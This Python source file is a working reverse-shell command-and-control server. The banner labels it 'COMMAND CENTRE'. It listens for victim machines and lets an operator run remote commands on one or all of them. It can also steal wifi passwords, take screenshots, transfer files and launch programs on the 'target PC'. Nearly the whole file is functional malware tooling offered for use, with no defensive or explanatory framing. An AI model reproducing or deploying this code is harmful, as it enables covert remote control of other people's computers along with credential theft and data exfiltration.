import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal

import json
import base64
from colorama import Fore, Back, Style
from pyfiglet import Figlet




NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

COMMANDS = {'help':['Shows this help'],
            'list':['Lists connected clients'],
            'select':['Selects a client by its index. Takes index as a parameter'],
            'quit':['Stops current connection with a client. To be used when client is selected'],
            'shutdown':['Shuts server down'],
           }

class MultiServer(object):
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 4444
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                self.ip = address
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def sendtoall(self,target, data):
        m = "sendalljl "
        try:
            
            m += data
            target.send(m.encode("utf-8"))
            print(m)
            
            
           
        except Exception as e:
            print("here " +str(e))
        



    def start_turtle(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input(Fore.GREEN +'Option[+] ')
            try:
                if cmd == 'list':
                    self.list_connections()
                    continue
                elif cmd[:7] == "sendall":
                    lengh_of_targ = len(self.all_connections)
                    i = 0 
                    try:
                        while i < lengh_of_targ:
                            targetnum = self.all_connections[i]
                            #print(targetnum)
                            
                            self.sendtoall(targetnum, cmd)
                            i += 1
                    except Exception as e:
                        print("[!] Failed to send command to all targets "+str(e))
                    
                elif 'select' in cmd:
                    target, conn = self.get_target(cmd)
                    if conn is not None:
                    
                        self.send_target_commands(target, conn)
                elif cmd == 'exit':
                        queue.task_done()
                        queue.task_done()
                        print('Server shutdown')
                        #break
                        self.quit_gracefully()
                elif cmd == 'help':
                    self.print_help()
                elif cmd == '':
                    pass
                else:
                    print('Command not recognized')
            except:
                print("Error occured")
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data


    def send_msg(self, data,conn):
        data = struct.pack('>I', len(data)) + data
        conn.sendall(data)


    def send_target_commands(self, target, conn):
        """ Connect with remote target client 
        :param conn: 
        :param target: 
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        #print(cwd, end="")
        
        while True:
            global count 
            count = 1
            try:
                cmd = input("\n[+] " +Fore.WHITE)
                conn.send(str.encode(cmd))
            
                if cmd == 'exit':
                    break

                elif cmd == 'q':
                    break
                elif cmd[:9] =="wifi_pass":
                    wifi = self.read_command_output(conn)
                    print(wifi.decode("utf-8"))
                    continue
                 
                    
                    
                elif cmd[:10] == "screen":
                    with open("screenshot%d.png" %count, "wb") as screen:
                        try:
                            img = self.read_command_output(conn)
                            img_dcode = base64.b64decode(img)
                            if img_dcode[:3] == "[!]":
                                print(img_dcode)
                            else:
                                screen.write(img_dcode)
                                count +=1
                                print(Fore.BLUE +"\nSuccessful screenshot ...")
                        except:
                            print(Fore.RED +"\nError occured")
                    
                elif cmd[:6] == "upload":
                    try:
                        file = cmd[7:]
                        file = open(file, "rb")
                        datai = file.read()
                        file.close()
                        self.send_msg(base64.b64encode(datai),conn)
                        print(Fore.BLUE +"\nUpload successful..")
                    except:
                        print(Fore.RED +"Failed to upload")
                        self.send_msg("Failed to upload".encode(),conn)
                    
                    
                elif cmd[:8] == "download":
                    try:
                        data = self.read_command_output(conn)
                        file_name = cmd[9:]
                        new_file = open(file_name, "wb")
                        new_file.write(base64.b64decode(data))
                        new_file.close()
                        print(Fore.BLUE +"\nDownload successful..")
                    except:
                        print(Fore.RED+"\nFailed to download")
                        self.send_msg("none".encode(),conn)
                    
                    
                elif len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print("\n"+Fore.YELLOW+client_response, end="")
                
                    
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break
                
        del self.all_connections[target]
        del self.all_addresses[target]
        return




print('WELCOME TO COAC\n Jack')
print (Fore.BLUE + """
	
██╗    ██╗███████╗ ██████╗██████╗ 
██║    ██║██╔════╝██╔════╝╚════██╗
██║ █╗ ██║███████╗██║      █████╔╝           ____                        __  __            _          _
|  _ \ __ _ _ __  ___ _ __  |  \/  | __ _  ___| |__   ___| |_ ___    ________
| |_) / _` | '_ \/ _ \ '__| | |\/| |/ _` |/ __| '_ \ / _ \ __/ _ \  /_______/
|  __/ (_| | |_)|  __/ |    | |  | | (_| | (__| | | |  __/ ||  __/  \_______\\
|_|   \__,_| .__/\___|_|    |_|  |_|\__,_|\___|_| |_|\___|\__\___|  /_______/
           |_|     
██║███╗██║╚════██║██║     ██╔═══╝ 
╚███╔███╔╝███████║╚██████╗███████╗
 ╚══╝╚══╝ ╚══════╝ ╚═════╝╚══════╝
                                  
	""",) 
print(Fore.RED +"""
                            COMMAND CENTRE
                    target        --> List all connections
                    session n     --> Iteract with sessions where n is the session id
                    sendall       --> Send  commands to all available connections
                    exit          --> Exit or terminate the reverse shell
 """)
print(Fore.GREEN + """                  
                Downnload path     :Download file form PC
                upload path        :Upload file to the target PC
                get url            :Download files from server to Target PC
                start path         :Start program in target PC
                screen             :Take screenshot in Target Monitor
                check              :Check Administrator Privilages
                q                  :Quit Shell
                exit               :Exit or terminate the session
                                """)
print(Fore.YELLOW +"[+] Waiting for targets to connect ....")





def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_turtle()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
